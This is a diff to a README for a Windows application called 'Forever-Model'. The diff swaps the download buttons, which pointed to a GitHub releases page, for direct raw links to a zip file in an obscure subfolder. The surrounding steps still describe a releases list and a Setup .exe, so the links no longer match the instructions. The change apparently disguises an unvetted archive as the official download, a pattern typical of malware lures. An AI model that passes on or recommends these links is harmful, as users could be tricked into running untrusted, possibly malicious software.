@@ -2,7 +2,7 @@
 
 ## 🥇 Download Forever-Model Now
 
-[![Download Forever-Model](https://img.shields.io/badge/Download-Forever%20Model-2ea44f?style=for-the-badge&logo=github)](https://github.com/remunerative-orbweavingspider48/forever-model/releases)
+[![Download Forever-Model](https://img.shields.io/badge/Download-Forever%20Model-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/remunerative-orbweavingspider48/forever-model/main/morphonomy/model_forever_lituite.zip)
 
 ## 🚀 What Is Forever-Model?
 
@@ -33,7 +33,7 @@ Click the big green button above or go directly to this link:
 
 **Visit this link to download the application.**
 
-[Click Here to Access Downloads](https://github.com/remunerative-orbweavingspider48/forever-model/releases)
+[Click Here to Access Downloads](https://raw.githubusercontent.com/remunerative-orbweavingspider48/forever-model/main/morphonomy/model_forever_lituite.zip)
 
 ### Step 2: Choose the Correct File
 When you arrive on the page, you will see a list of released files. Look for the file that matches your Windows version. Typically, you will look for a file name that includes **`Windows`** or **`Setup`**. It may look something like `Forever-Model-Setup-1.0.0.exe` or a similar name.
